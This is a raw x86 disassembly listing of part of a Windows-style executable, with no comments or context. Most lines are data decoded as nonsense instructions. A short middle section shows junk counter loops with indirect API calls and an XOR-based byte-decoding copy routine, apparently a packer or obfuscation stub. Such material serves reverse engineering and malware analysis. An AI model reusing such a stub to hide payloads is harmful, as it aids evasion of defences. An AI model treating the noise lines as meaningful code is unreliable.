  40f219:	and    eax,0x68faf423
  40f21e:	xchg   BYTE PTR [ebp-0x67],bl
  40f221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f222:	mov    ah,0xea
  40f224:	fucomip st,st(0)
  40f226:	cmp    dl,dl
  40f228:	int    0x13
  40f22a:	cmp    dl,BYTE PTR [esi-0x2f]
  40f22d:	shr    bl,0xc5
  40f230:	(bad)  
  40f231:	cdq    
  40f232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f233:	mov    al,0xe4
  40f235:	push   cs
  40f236:	(bad)  
  40f237:	xor    DWORD PTR [eax+0x5f],ebx
  40f23a:	mov    ds:0x2040b246,eax
  40f23f:	inc    esp
  40f240:	or     ecx,DWORD PTR [ecx-0x57c60f9a]
  40f246:	call   0xee96fec3
  40f24b:	retf   0x8db2
  40f24e:	add    al,0x70
  40f250:	clc    
  40f251:	test   al,0xbc
  40f253:	cmc    
  40f254:	sbb    ecx,DWORD PTR [ecx+eax*4]
  40f257:	xor    ebp,DWORD PTR es:0x32a3ead1
  40f25e:	(bad)  
  40f25f:	pushf  
  40f260:	xor    cl,BYTE PTR [eax]
  40f262:	inc    ebx
  40f263:	or     edi,esi
  40f265:	dec    edi
  40f266:	sbb    eax,0xdedb5332
  40f26b:	cmp    al,0x1a
  40f26d:	jbe    0x40f260
  40f26f:	xor    eax,0x313f45de
  40f274:	mov    ah,0xa8
  40f276:	ds popa 
  40f278:	mov    dh,0x1e
  40f27a:	xor    al,0xde
  40f27c:	out    0x6b,al
  40f27e:	les    edx,FWORD PTR [edx+0x128ec650]
  40f284:	mov    ecx,0x7427ae22
  40f289:	test   eax,0x6b164ecb
  40f28e:	dec    esi
  40f28f:	mov    ah,0xb5
  40f291:	sub    eax,0x437b7ce7
  40f296:	pop    ss
  40f297:	sbb    ch,BYTE PTR [edx]
  40f299:	jnp    0x40f2cc
  40f29b:	mov    BYTE PTR [esp+ecx*8],ah
  40f29e:	loope  0x40f28a
  40f2a0:	cld    
  40f2a1:	sbb    al,0xd1
  40f2a3:	adc    eax,0x305dc33d
  40f2a8:	mov    edi,DWORD PTR [ecx]
  40f2aa:	sbb    ecx,ecx
  40f2ac:	add    eax,0x62946a6d
  40f2b1:	xchg   ecx,eax
  40f2b2:	mov    edi,ebx
  40f2b4:	ret    0xd0d5
  40f2b7:	shl    cl,1
  40f2b9:	jecxz  0x40f26c
  40f2bb:	test   DWORD PTR ss:[edx],ebx
  40f2be:	(bad)  
  40f2bf:	and    eax,0x45107048
  40f2c4:	loop   0x40f2f8
  40f2c6:	fadd   DWORD PTR [edx]
  40f2c8:	div    DWORD PTR [ebx]
  40f2ca:	jae    0x40f326
  40f2cc:	xchg   esp,eax
  40f2cd:	test   ebp,0x3325aefd
  40f2d3:	je     0x40f312
  40f2d5:	(bad)  
  40f2d6:	sub    DWORD PTR [edx+0x23],edi
  40f2d9:	or     bh,BYTE PTR [ecx-0x13]
  40f2dc:	(bad)  
  40f2dd:	cmp    eax,0x6fda243
  40f2e2:	ret    0x2f6e
  40f2e5:	push   ecx
  40f2e6:	xlat   BYTE PTR ds:[ebx]
  40f2e7:	gs and al,0x44
  40f2ea:	xchg   edi,eax
  40f2eb:	xchg   ebx,eax
  40f2ec:	pop    esi
  40f2ed:	in     eax,0x7d
  40f2ef:	vpshld ymm15,xmm1,[edi]
  40f2f4:	dec    edi
  40f2f5:	lods   eax,DWORD PTR ds:[esi]
  40f2f6:	or     al,0x70
  40f2f8:	mov    bl,0xe8
  40f2fa:	jle    0x40f2f5
  40f2fc:	rol    DWORD PTR [edx+0x15],0xaa
  40f300:	in     eax,dx
  40f301:	cmp    ebp,ebx
  40f303:	imul   ebp,DWORD PTR [ebx+0xf],0xffffffb0
  40f307:	fsub   st,st(1)
  40f309:	(bad)  
  40f30a:	jo     0x40f2fc
  40f30c:	sub    DWORD PTR [eax],ebp
  40f30e:	cld    
  40f30f:	lods   al,BYTE PTR ds:[esi]
  40f310:	dec    ebp
  40f311:	mov    al,ds:0xca7b892e
  40f316:	xchg   ecx,eax
  40f317:	push   0x47ed726b
  40f31c:	jg     0x40f300
  40f31e:	or     esp,DWORD PTR [eax-0x26b6a188]
  40f324:	cmp    ch,BYTE PTR [edi]
  40f326:	scas   al,BYTE PTR es:[edi]
  40f327:	or     eax,0x2f5e37ea
  40f32c:	cwde   
  40f32d:	xchg   ecx,eax
  40f32e:	shl    ecx,cl
  40f330:	or     al,0x1c
  40f332:	retf   0x6b34
  40f335:	in     eax,0x87
  40f337:	dec    esp
  40f338:	mov    dl,BYTE PTR [eax-0x12]
  40f33b:	inc    eax
  40f33c:	in     al,0xf3
  40f33e:	mov    eax,DWORD PTR [ebx]
  40f340:	pop    edx
  40f341:	les    esi,FWORD PTR [ebx-0x14]
  40f344:	mov    bl,BYTE PTR [edx+0x3fcdb537]
  40f34a:	shl    DWORD PTR [ebx],cl
  40f34c:	xor    eax,0xc614063f
  40f351:	mov    WORD PTR [esi+0x44be20b4],?
  40f357:	test   ebx,0x113d2320
  40f35d:	fnstsw WORD PTR ds:0xa6ffb227
  40f363:	dec    ebx
  40f364:	jge    0x40f327
  40f366:	dec    edx
  40f367:	mov    bl,0xfb
  40f369:	xchg   esi,eax
  40f36a:	or     eax,DWORD PTR [edx+ecx*8+0x3e80732a]
  40f371:	and    al,0x12
  40f373:	xor    bl,BYTE PTR [eax+0x2b76fab3]
  40f379:	(bad)  [ebx]
  40f37b:	add    BYTE PTR ds:0x93b22e7b,bh
  40f381:	and    bh,BYTE PTR [eax-0x7637acf]
  40f387:	and    DWORD PTR ds:0x433727,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x433727
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x433727,ecx
  40f3a0:	cmp    DWORD PTR ds:0x433727,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x433727,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x433727
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x433727,ecx
  40f3d0:	cmp    DWORD PTR ds:0x433727,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x43362b
  40f3e3:	mov    ecx,DWORD PTR ds:0x433703
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x433657,0x13
  40f3fb:	cmp    DWORD PTR ds:0x433657,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x433657,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x433657
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x433657,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x4336ef,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x4336ef
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f444:	cmp    DWORD PTR ds:0x4336ef,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x4336ef,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x4336ef
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x4336ef,ecx
  40f474:	cmp    DWORD PTR ds:0x4336ef,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x4336db,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x4336db
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x4336db,edx
  40f498:	cmp    DWORD PTR ds:0x4336db,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433891
  40f4af:	push   0x4338e7
  40f4b4:	push   0x4338cb
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x4336db,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433717
  40f4d2:	adc    DWORD PTR ds:0x433727,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax+0x5ff3be39]
  40f540:	mov    esp,ss
  40f542:	lods   al,BYTE PTR ds:[esi]
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	mov    esi,0x2d53d77f
  40f54e:	loopne 0x40f591
  40f550:	inc    esi
  40f551:	addr16 hlt 
  40f553:	pop    edx
  40f554:	mov    ds:0x359e705b,eax
  40f559:	inc    ebx
  40f55a:	ret    0xc252
  40f55d:	dec    edx
  40f55e:	cwde   
  40f55f:	adc    al,0x6a
  40f561:	dec    ebp
  40f562:	adc    al,BYTE PTR [eax]
  40f564:	rol    BYTE PTR [esi-0x4c],0x45
  40f568:	mov    cl,BYTE PTR [ebx-0x47]
  40f56b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f56d:	lea    edx,[edx+0x4e44bdd4]
  40f573:	jg     0x40f511
  40f575:	sub    DWORD PTR [ebx-0x14],edi
  40f578:	mov    dh,0x7c
  40f57a:	push   ss
  40f57b:	jno    0x40f58c
  40f57d:	jmp    0xa7db:0x17588731
  40f584:	or     BYTE PTR [edi+0x7],al
  40f587:	push   0x9287e40e
  40f58c:	pop    ebx
  40f58d:	mov    edi,0x75d7aa67
  40f592:	jb     0x40f527
  40f594:	scas   al,BYTE PTR es:[edi]
  40f595:	push   ebp
  40f596:	inc    edx
  40f597:	pop    ebp
  40f598:	cmp    ah,BYTE PTR [eax+ecx*8+0x3dea1069]
  40f59f:	ins    DWORD PTR es:[edi],dx
  40f5a0:	sysret 
  40f5a2:	arpl   sp,cx
  40f5a4:	add    al,0x2e
  40f5a6:	dec    edx
  40f5a7:	sbb    BYTE PTR [eax-0x4d],dh
  40f5aa:	inc    edi
  40f5ab:	jb     0x40f59d
  40f5ad:	outs   dx,BYTE PTR ds:[esi]
  40f5ae:	xchg   DWORD PTR [edi],esi
  40f5b0:	and    edi,DWORD PTR [ebx-0x5c411668]
  40f5b6:	mov    bh,0x82
  40f5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b9:	pop    esi
  40f5ba:	jae    0x40f5a6
  40f5bc:	and    ebp,DWORD PTR [esi+ecx*2]
  40f5bf:	in     eax,0x50
  40f5c1:	xchg   ebp,eax
  40f5c2:	adc    al,0xaf
  40f5c4:	push   es
  40f5c5:	lea    edx,[ebp+ecx*1+0x607380ad]
  40f5cc:	adc    eax,0x6e5d1c64
  40f5d1:	lea    ebp,[ebx+0x3364c001]
  40f5d7:	cmp    eax,0xb9995d9b
  40f5dc:	and    al,0x56
  40f5de:	rol    BYTE PTR [ebx],0x3d
  40f5e1:	sbb    BYTE PTR [eax+0xd],al
  40f5e4:	or     ch,bl
  40f5e6:	or     ah,0xf4
  40f5e9:	aas    
  40f5ea:	sub    DWORD PTR [ebx+edx*8-0x3f],eax
  40f5ee:	and    esp,0xcffb562
  40f5f4:	adc    ebx,DWORD PTR [ebx-0x37]
  40f5f7:	or     al,0x64
  40f5f9:	rcl    ah,1
  40f5fb:	in     eax,dx
  40f5fc:	mov    eax,0xf07bbb84
  40f601:	or     BYTE PTR [edi+eiz*1],bl
  40f604:	(bad)  
  40f605:	cli    
  40f606:	jg     0x40f5a5
  40f608:	stos   BYTE PTR es:[edi],al
  40f609:	gs sbb eax,0x27d7c43c
  40f60f:	jp     0x40f66e
  40f611:	aam    0x36
  40f613:	dec    ebx
  40f614:	rcl    DWORD PTR [edx-0x1295af12],cl
  40f61a:	jg     0x40f59c
  40f61c:	(bad)  
  40f61d:	pop    ds
  40f61e:	mov    dh,bh
  40f620:	out    0xb8,eax
  40f622:	add    DWORD PTR [eax+esi*2+0x15],esp
  40f626:	and    eax,0x8e0c9087
  40f62b:	pop    ebx
  40f62c:	shl    BYTE PTR [edx+0x1e7f49ad],cl
  40f632:	sub    eax,0xee131110
  40f637:	dec    esi
  40f638:	sub    BYTE PTR ds:0xf1c28a05,bh
  40f63e:	mov    ebx,0x97e763fd
  40f643:	lock sbb al,0xef
  40f646:	arpl   WORD PTR [bp-0x6d36],bp
  40f64b:	and    BYTE PTR [edx-0x11bd6f12],ch
  40f651:	nop
  40f652:	inc    esi
  40f653:	push   edi
  40f654:	xchg   esp,eax
  40f655:	ins    DWORD PTR es:[edi],dx
  40f656:	loopne 0x40f673
  40f658:	mov    bh,0x3f
  40f65a:	ins    BYTE PTR es:[edi],dx
  40f65b:	into   
  40f65c:	xchg   ebp,eax
  40f65d:	int    0xc1
  40f65f:	xchg   edi,eax
  40f660:	retf   0x816c
  40f663:	ja     0x40f6d7
  40f665:	and    cl,BYTE PTR [esi]
  40f667:	rcr    BYTE PTR [edi+0x43a3a487],1
  40f66d:	in     al,0x2e
  40f66f:	(bad)  
  40f670:	fcomp  QWORD PTR [edx+esi*4-0x4d2d4d4]
  40f677:	fimul  DWORD PTR [ecx]
  40f679:	stos   DWORD PTR es:[edi],eax
  40f67a:	fstp   DWORD PTR [edx]
  40f67c:	dec    eax
  40f67d:	jo     0x40f62e
  40f67f:	or     bl,BYTE PTR [esi+0x5f0017fd]
  40f685:	xor    BYTE PTR [eax],ch
  40f687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f688:	xchg   ah,dh
  40f68a:	pop    ebx
  40f68b:	add    edx,DWORD PTR [edi+edx*1]
  40f68e:	out    dx,al
  40f68f:	or     BYTE PTR [ebx-0x21],cl
  40f692:	cmp    eax,DWORD PTR [eax+0x3d1de0be]
  40f698:	jae    0x40f629
  40f69a:	rcr    edx,0x2b
  40f69d:	call   0x1b27:0xf7d8d6dc
  40f6a4:	ins    BYTE PTR es:[edi],dx
  40f6a5:	into   
  40f6a6:	call   0x6d0a:0x6a3f2d19
  40f6ad:	add    al,0xea
  40f6af:	inc    esp
  40f6b0:	xchg   esi,ebp
  40f6b2:	inc    ebp
  40f6b3:	popa   
  40f6b4:	hlt    
  40f6b5:	iret   
  40f6b6:	inc    ecx
  40f6b7:	pop    eax
  40f6b8:	xchg   BYTE PTR [ecx+edi*1-0x5a55a03c],bl
  40f6bf:	xor    al,0xd0
  40f6c1:	nop
  40f6c2:	jge    0x40f67f
  40f6c4:	dec    edx
  40f6c5:	or     eax,0x1d4fe392
  40f6ca:	fistp  QWORD PTR [ebp+0x22ac46d6]
  40f6d0:	cmp    BYTE PTR [edi-0x5b7c6d1d],0xa7
  40f6d7:	out    dx,al
  40f6d8:	fwait
  40f6d9:	outs   dx,DWORD PTR ds:[esi]
  40f6da:	daa    
  40f6db:	repnz push es
  40f6dd:	fs stos BYTE PTR es:[edi],al
  40f6df:	jecxz  0x40f680
  40f6e1:	cmp    DWORD PTR [edx],edi
  40f6e3:	cmp    eax,0x27d89193
  40f6e8:	lea    ebp,[edi+0x19]
  40f6eb:	or     edx,esp
  40f6ed:	sub    cl,BYTE PTR [ebp-0x1e]
  40f6f0:	scas   eax,DWORD PTR es:[edi]
  40f6f1:	scas   eax,DWORD PTR es:[edi]
  40f6f2:	icebp  
  40f6f3:	mov    edx,0xa4004e67
  40f6f8:	sbb    ebp,DWORD PTR [esi+0x579ea4d3]
  40f6fe:	sbb    BYTE PTR [esi],dh
  40f700:	aaa    
  40f701:	call   0xe3a9:0xfc93b5ce
  40f708:	je     0x40f731
  40f70a:	xor    dl,BYTE PTR [ebx-0x3b7e7975]
  40f710:	mov    al,ds:0xa6f1b3a3
  40f715:	inc    edx
  40f716:	and    BYTE PTR [ecx+0x14],bl
  40f719:	mov    bh,dh
  40f71b:	imul   ebp,ecx,0x4b8090b1
  40f721:	iret   
  40f722:	add    eax,0x8c56238c
  40f727:	mov    esp,0x895f49e7
  40f72c:	jp     0x40f752
  40f72e:	jle    0x40f70d
  40f730:	rep ins BYTE PTR es:[edi],dx
  40f732:	mov    al,ds:0xe7fa6ce0
  40f737:	neg    ch
  40f739:	or     ah,BYTE PTR [ebx]
  40f73b:	and    esp,edi
  40f73d:	dec    edx
  40f73e:	retf   0xa119
  40f741:	(bad)  
  40f742:	std    
  40f743:	lea    esp,[esi]
  40f745:	jmp    0xfdec:0x2b90bf70
  40f74c:	ins    DWORD PTR es:[edi],dx
  40f74d:	pop    ecx
  40f74e:	mov    ah,0x67
  40f750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f751:	(bad)  
  40f753:	push   edx
  40f754:	adc    ch,BYTE PTR [ecx]
  40f756:	int3   
  40f757:	inc    esp
  40f758:	and    eax,DWORD PTR [edx+0x60]
  40f75b:	repnz inc edi
  40f75d:	retf   0x415c
  40f760:	xchg   BYTE PTR [eax-0x45],dl
  40f763:	jmp    0xa91:0xba2456ca
  40f76a:	xor    ch,BYTE PTR gs:0xcf560e2e
  40f771:	ds xchg ecx,eax
  40f773:	in     al,0x1
  40f775:	dec    eax
  40f776:	pop    edx
  40f777:	imul   esi,edx,0x1d812f7a
  40f77d:	ins    BYTE PTR es:[edi],dx
  40f77e:	mov    bl,0xb9
  40f780:	cmp    BYTE PTR [ecx+0x2c8ef3d5],ch
  40f786:	lods   al,BYTE PTR ds:[esi]
  40f787:	pop    ds
  40f788:	mov    dl,0x94
  40f78a:	sbb    esi,esp
  40f78c:	dec    ebx
  40f78d:	and    al,0xba
  40f78f:	cs cmp ecx,ebp
  40f792:	mov    al,0x21
  40f794:	mov    DWORD PTR [ebx+0x65920d9b],edi
  40f79a:	pop    edx
  40f79b:	cli    
  40f79c:	mov    gs,WORD PTR [edi-0x44]
  40f79f:	imul   eax,DWORD PTR [esi+0x33],0x25dab2e4
  40f7a6:	test   al,0xc9
  40f7a8:	mov    cs,WORD PTR ds:0x353b95de
  40f7ae:	mov    ebp,0x3850386e
  40f7b3:	xor    esp,ecx
  40f7b5:	sbb    al,0x8
  40f7b7:	out    dx,eax
  40f7b8:	stos   DWORD PTR es:[edi],eax
  40f7b9:	inc    ecx
  40f7ba:	push   edx
  40f7bb:	xor    eax,0x6479d377
  40f7c0:	ins    BYTE PTR es:[edi],dx
  40f7c1:	pop    gs
  40f7c3:	retf   
  40f7c4:	inc    edi
  40f7c5:	dec    edx
  40f7c6:	cmp    DWORD PTR [esi-0xa6e03e4],esi
  40f7cc:	test   edi,ebp
  40f7ce:	test   eax,0xd108c9ec
  40f7d3:	pop    edi
  40f7d4:	xchg   bh,dl
  40f7d6:	test   BYTE PTR [edx],dh
  40f7d8:	jo     0x40f7a9
  40f7da:	mov    WORD PTR [ebx],?
  40f7dc:	mov    ah,0x54
  40f7de:	jno    0x40f85b
  40f7e0:	(bad)  
  40f7e1:	and    al,0x5a
  40f7e3:	and    BYTE PTR [ecx-0xe],ch
  40f7e6:	ja     0x40f77f
  40f7e8:	ret    0xb25d
  40f7eb:	repnz mov al,ds:0x1ae16b38
  40f7f1:	rcr    DWORD PTR gs:[eax+0x43],0xec
  40f7f6:	sub    al,0xf9
  40f7f8:	(bad)  
  40f7f9:	lea    esp,[edi-0x35]
  40f7fc:	adc    al,0xec
  40f7fe:	fs or  ebx,ebx
  40f801:	xchg   DWORD PTR [edi+0x43],edx
  40f804:	mov    esp,DWORD PTR [edi+eax*8-0x328143ca]
  40f80b:	sbb    eax,0xc7ee3d6d
  40f810:	mov    al,0x60
  40f812:	and    eax,DWORD PTR [edx-0x683f9bb6]
  40f818:	add    dl,BYTE PTR [ecx+esi*2-0x18]
  40f81c:	sub    DWORD PTR [eax],0x75
  40f81f:	(bad)  
  40f820:	icebp  
  40f821:	push   edi
  40f822:	hlt    
  40f823:	sbb    eax,0x451dcc9
  40f828:	pop    ecx
  40f829:	or     DWORD PTR [esi],edi
  40f82b:	bound  esp,QWORD PTR [ecx]
  40f82d:	add    al,ah
  40f82f:	pusha  
  40f830:	aam    0x32
  40f832:	jno    0x40f889
  40f834:	jecxz  0x40f806
  40f836:	enter  0x576a,0x4f
  40f83a:	mov    ch,0xf8
  40f83c:	scas   eax,DWORD PTR es:[edi]
  40f83d:	jle    0x40f7e7
  40f83f:	xchg   ecx,eax
  40f840:	inc    eax
  40f841:	sbb    al,0xcd
  40f843:	sahf   
  40f844:	stos   BYTE PTR es:[edi],al
  40f845:	scas   eax,DWORD PTR es:[edi]
  40f846:	xchg   esi,eax
  40f847:	add    eax,0x332680c7
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x6b96ac3f
  40f897:	(bad)  
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	add    BYTE PTR [ecx-0x493fb732],ah
  40f8a6:	outs   dx,DWORD PTR ds:[esi]
  40f8a7:	pop    ecx
  40f8a8:	pop    ds
  40f8a9:	pop    ebx
  40f8aa:	xchg   BYTE PTR [eax+0x579f2b],ch
  40f8b0:	jno    0x40f8c4
  40f8b2:	pop    ss
  40f8b3:	data16 xor al,0xe9
  40f8b6:	mov    ch,0x19
  40f8b8:	or     dl,BYTE PTR [edi+0x14d16c72]
  40f8be:	bound  ecx,QWORD PTR [eax-0x23]
  40f8c1:	and    edx,ebp
  40f8c3:	sbb    eax,0xfcf518f2
  40f8c8:	dec    edx
  40f8c9:	call   0x827d:0x17c0f1cf
  40f8d0:	push   es
  40f8d1:	test   eax,0x8faf9c05
  40f8d6:	mov    dh,0xf0
  40f8d8:	rol    edx,0x67
  40f8db:	in     eax,0x44
  40f8dd:	rcr    DWORD PTR [edi-0x1452f819],1
  40f8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8e4:	push   ebp
  40f8e5:	in     eax,0xb1
  40f8e7:	mov    bh,ch
  40f8e9:	cmp    al,0x13
  40f8eb:	je     0x40f913
  40f8ed:	push   cs
  40f8ee:	pop    esp
  40f8ef:	inc    ebp
  40f8f0:	push   esi
  40f8f1:	xor    al,0x39
  40f8f3:	mov    eax,0x6555d3f8
  40f8f8:	les    edi,FWORD PTR [ecx]
  40f8fa:	mov    esi,0x3ca561d2
  40f8ff:	or     dl,bh
  40f901:	fisub  DWORD PTR [ecx-0x4931d249]
  40f907:	outs   dx,DWORD PTR ds:[esi]
  40f908:	clc    
  40f909:	xchg   BYTE PTR ds:0xad73e755,ah
  40f90f:	nop
  40f910:	jecxz  0x40f94b
  40f912:	mov    fs:0x4e7bfd7c,al
  40f918:	xchg   edi,eax
  40f919:	cdq    
  40f91a:	pop    esp
  40f91b:	sub    eax,0x352e3a41
  40f920:	rcl    ch,1
  40f922:	rol    DWORD PTR [eax],cl
  40f924:	xchg   edi,eax
  40f925:	int    0x47
  40f927:	mov    ?,WORD PTR [eax+0x1658dd6a]
  40f92d:	imul   edi,DWORD PTR [ebx],0x1d
  40f930:	xor    al,0xb5
  40f932:	ret    0xc554
  40f935:	mov    eax,DWORD PTR [ecx]
  40f937:	es icebp 
  40f939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f93a:	adc    eax,0x73ea6173
  40f93f:	add    BYTE PTR [ebp+0x202b768b],bh
  40f945:	ffree  st(3)
  40f947:	cs dec ecx
  40f949:	(bad)  
  40f94a:	lahf   
  40f94b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f94c:	push   es
  40f94d:	std    
  40f94e:	fcmovnbe st,st(5)
  40f950:	outs   dx,DWORD PTR ds:[esi]
  40f951:	push   es
  40f952:	push   esp
  40f953:	fsubr  QWORD PTR [ebx]
  40f955:	test   eax,0x316e6f82
  40f95a:	add    eax,0x92000533
  40f95f:	(bad)  
  40f960:	out    0x71,al
  40f962:	sub    BYTE PTR [esi],dl
  40f964:	fninit 
  40f966:	repz xlat BYTE PTR ds:[ebx]
  40f968:	(bad)  
  40f969:	lock or dh,BYTE PTR cs:[eax]
  40f96d:	icebp  
  40f96e:	outs   dx,DWORD PTR ds:[esi]
  40f96f:	sbb    esi,DWORD PTR [eax]
  40f971:	test   al,0xac
  40f973:	mov    ebx,0xa9c873a2
  40f978:	xor    BYTE PTR [ebp+0x4e],dh
  40f97b:	std    
  40f97c:	stos   BYTE PTR es:[edi],al
  40f97d:	sbb    DWORD PTR [ebp+0x5ad3bd97],0xffffffcf
  40f984:	sub    al,0xe7
  40f986:	mov    BYTE PTR [edi+0x49782951],0xc2
  40f98d:	push   esp
  40f98e:	in     al,0x89
  40f990:	movaps xmm5,xmm1
  40f993:	push   ds
  40f994:	jns    0x40f9f0
  40f996:	xor    ecx,DWORD PTR [ebx+0x5b96304d]
  40f99c:	jp     0x40f951
  40f99e:	adc    al,0x12
  40f9a0:	(bad)
  40f9a4:	cmp    BYTE PTR cs:[ebx],ah
  40f9a7:	jns    0x40f9f9
  40f9a9:	fidivr DWORD PTR [edx-0x26]
  40f9ac:	sub    esi,DWORD PTR [esi-0x1017f7bc]
  40f9b2:	in     al,dx
  40f9b3:	or     al,0x88
  40f9b5:	int3   
  40f9b6:	daa    
  40f9b7:	rcl    BYTE PTR [ebp-0x23],cl
  40f9ba:	stc    
  40f9bb:	pushf  
  40f9bc:	daa    
  40f9bd:	call   0xab676dc6
  40f9c2:	jg     0x40f967
  40f9c4:	sbb    cl,BYTE PTR [eax-0xd57a4b7]
  40f9ca:	scas   al,BYTE PTR es:[edi]
  40f9cb:	cli    
  40f9cc:	jb     0x40fa06
  40f9ce:	aas    
  40f9cf:	test   al,0x4d
  40f9d1:	ss popa 
  40f9d3:	shr    BYTE PTR [ebx+0x2f],1
  40f9d6:	pusha  
  40f9d7:	dec    eax
  40f9d8:	lods   al,BYTE PTR ds:[esi]
  40f9d9:	mov    eax,0x5f6ea07b
  40f9de:	adc    al,0xda
  40f9e0:	push   esi
  40f9e1:	les    edx,FWORD PTR [eax-0x8da8732]
  40f9e7:	inc    edx
  40f9e8:	dec    ebx
  40f9e9:	xchg   esi,eax
  40f9ea:	jmp    0x8fb4f4ee
  40f9ef:	sub    al,0x63
  40f9f1:	xchg   edx,eax
  40f9f2:	add    al,BYTE PTR [ecx+0x8]
  40f9f5:	sub    edx,DWORD PTR [edx]
  40f9f7:	loopne 0x40f9bc
  40f9f9:	sub    esp,DWORD PTR [eax-0x18903272]
  40f9ff:	sbb    ecx,ecx
  40fa01:	mov    cl,0xaf
  40fa03:	dec    eax
  40fa04:	dec    eax
  40fa05:	dec    ebx
  40fa06:	xor    ebp,DWORD PTR [esi+0x38]
  40fa09:	pusha  
  40fa0a:	xchg   ecx,eax
  40fa0b:	inc    esp
  40fa0c:	sub    ebp,ebp
  40fa0e:	pop    edx
  40fa0f:	sub    al,BYTE PTR [ebx+edx*4]
  40fa12:	into   
  40fa13:	cs lods al,BYTE PTR gs:[esi]
  40fa16:	add    edi,eax
  40fa18:	cmp    DWORD PTR [edx],edx
  40fa1a:	call   0xd7f284c2
  40fa1f:	sahf   
  40fa20:	cli    
  40fa21:	aam    0x41
  40fa23:	cmc    
  40fa24:	lahf   
  40fa25:	mov    ebp,0xa29466ff
  40fa2a:	dec    ecx
  40fa2b:	lods   eax,DWORD PTR ds:[esi]
  40fa2c:	lahf   
  40fa2d:	jo     0x40fa98
  40fa2f:	lods   eax,DWORD PTR ds:[esi]
